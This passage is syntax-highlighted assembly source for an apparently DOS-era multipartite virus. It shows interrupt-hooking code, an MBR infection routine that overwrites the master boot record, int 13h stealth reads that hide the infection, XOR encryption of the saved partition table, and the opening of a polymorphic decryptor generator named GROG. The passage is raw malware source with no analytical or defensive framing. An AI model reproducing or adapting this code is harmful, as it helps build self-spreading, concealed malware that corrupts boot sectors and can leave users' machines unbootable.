        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">InVirus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; So, we recover the jump.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">saved21</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">   </span><span class="sc1">; mov al,[46ch]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3d</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">betta_dan_be4</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">betta_dan_be4</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21h_plural</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">jump_handle</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">               </span><span class="sc1">; We save real instructions</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">saved21</span><span class="sc0">
        </span><span class="sc6">movsd</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rehandle</span><span class="sc0">

</span><span class="sc5">go_away</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pop_all_regs</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">int8h</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú--ú-</span><span class="sc0">
</span><span class="sc1">;                               MBR Stuff</span><span class="sc0">
</span><span class="sc1">;-ú--ú-ú--ú-ú--úú-úú-ú--ú-úú-ú--ú-ú--ú-ú--ú-úú-ú--ú--úú-ú-úú-úú-ú--úú-ú-úú-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Aquel que se rompe los dientes con la c scara raramente come la</span><span class="sc0">
</span><span class="sc1">; almendra.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">MBR_start</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">MBR_real_start</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc2">512d</span><span class="sc4">-(</span><span class="sc5">boot_up_end</span><span class="sc4">-</span><span class="sc5">MBR_bootup</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MBR_Bootup</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Sector_3</span><span class="sc4">-(</span><span class="sc5">MBR_Start</span><span class="sc4">-</span><span class="sc5">Virus_starts</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">Sector_3</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">; Ok, we are now outta that 7c00h...</span><span class="sc0">

</span><span class="sc5">Int13h_relo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">int13h</span><span class="sc4">-(</span><span class="sc5">MBR_start</span><span class="sc4">-</span><span class="sc5">virus_starts</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">004ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Int13h_relo</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; movsd</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

                        </span><span class="sc1">; Relocate int 13h jump</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">cal</span><span class="sc4">-(</span><span class="sc5">MBR_start</span><span class="sc4">-</span><span class="sc5">virus_starts</span><span class="sc4">)],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13h_relo</span><span class="sc0">


        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004ch</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Int13_h</span><span class="sc4">-(</span><span class="sc5">MBR_start</span><span class="sc4">-</span><span class="sc5">virus_starts</span><span class="sc4">))</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Set new int13h</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                         </span><span class="sc1">; Boot: stealth will do</span><span class="sc0">


</span><span class="sc5">Int13_h</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; Int13h handler</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"_POT"</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@Dissapear</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Stealth_read</span><span class="sc0">
</span><span class="sc5">jmpto</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">Int13h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">call13h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int13h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">cal</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@Dissapear</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"ALSO"</span><span class="sc0">                  </span><span class="sc1">; %-)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">Stealth_read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">jmpto</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">jmpto</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call13h</span><span class="sc0">         </span><span class="sc1">; Make read</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call13h</span><span class="sc0">         </span><span class="sc1">; First sector read is now partition table.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Part_enc</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Decrypt_MBR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Decrypt_MBR</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; Return to host</span><span class="sc0">

</span><span class="sc5">Stupid_message</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Welcome to my world, adventurer. Follow me.'</span><span class="sc0">


</span><span class="sc5">Boot_up_end</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">

</span><span class="sc1">; END OF MBR SECTOR</span><span class="sc0">



</span><span class="sc5">MBR_Infection</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ES is set to old copy in file/mem</span><span class="sc0">
                            </span><span class="sc1">; BX is set then to the MBR_start there</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0281h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MBR_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff80h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Abort_MBR</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Part_enc</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">Encrypt_MBR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Encrypt_MBR</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">510d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">282h</span><span class="sc0">                 </span><span class="sc1">; Save MBR in sector two</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Abort_MBR</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GROG</span><span class="sc0">                </span><span class="sc1">; Gory Ruthless Opcode Generator</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">MBR_start</span><span class="sc0">       </span><span class="sc1">; Write new MBR and fuck up old one</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Abort_MBR</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">MBR_Bootup</span><span class="sc0">           </span><span class="sc1">; Optimizar</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">_stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Boot_up_end</span><span class="sc4">-</span><span class="sc5">MBR_Bootup</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; ds = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int13h</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004ch</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13_h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">004eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; Set new int13h</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">



</span><span class="sc5">Abort_MBR</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">MBR_end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">MBR_module_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">MBR_end</span><span class="sc4">-</span><span class="sc5">MBR_start</span><span class="sc0">


</span><span class="sc1">;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)</span><span class="sc0">
</span><span class="sc1">;(*                  Gory Ruthless Opcode Generator [GROG]                 *)</span><span class="sc0">
</span><span class="sc1">;(*ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ*)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Parameters:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   DX = Decryptor length</span><span class="sc0">
</span><span class="sc1">;   ES:DI = Buffer to make decryptor ( followed by boot-up code )</span><span class="sc0">
</span><span class="sc1">;   DS:SI = Going-to-crypt code</span><span class="sc0">
</span><span class="sc1">;   CX = Length of encrypted zone</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GROG</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">MBR_Bootup</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">_stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Boot_up_end</span><span class="sc4">-</span><span class="sc5">MBR_Bootup</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">



        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">MBR_Real_Start</span><span class="sc4">+</span><span class="sc2">151d</span><span class="sc0">
</span><span class="sc5">dec_1_length</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">512d</span><span class="sc4">-(</span><span class="sc5">boot_up_end</span><span class="sc4">-</span><span class="sc5">MBR_bootup</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">MBR_Bootup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Boot_up_end</span><span class="sc4">-</span><span class="sc5">MBR_Bootup</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">boot_decr_offset</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">boot_decr_inst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">do_crypt_inst</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">remaining</span><span class="sc4">],</span><span class="sc5">dec_1_length</span><span class="sc4">-</span><span class="sc2">153d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">@place_to</span><span class="sc4">],</span><span class="sc2">07c00h</span><span class="sc4">+(</span><span class="sc5">dec_1_length</span><span class="sc4">-(</span><span class="sc2">02d</span><span class="sc4">))</span><span class="sc0">

